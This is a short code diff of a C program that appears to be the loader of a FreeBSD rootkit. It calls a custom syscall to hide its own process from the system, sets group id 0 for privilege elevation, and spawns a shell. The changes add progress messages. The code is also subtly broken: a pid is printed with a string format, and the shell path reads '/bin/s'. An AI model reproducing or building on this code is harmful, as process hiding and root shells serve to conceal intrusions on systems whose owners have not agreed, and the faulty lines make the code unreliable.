@@ -20,7 +20,11 @@ main(int argc, char *argv[]){
   syscall_num = stat.data.intval;
 
   //pass in the syscall for process_hiding and the pid for itself
+  printf("Hiding self (%s)..\n", getpid());
+
   syscall(syscall_num, getpid()); //hide self
+
+  printf("Spawning shell..\n");
 
   //elevation
   setgid(0);
@@ -29,5 +33,5 @@ main(int argc, char *argv[]){
   //spawn shell
   //https://www.freebsd.org/cgi/man.cgi?query=exec&sektion=3&manpath=freebsd-release-ports
   execl("/bin/s", "sh", 0);
-  printf("shell spawned");
+  return 0;
 }
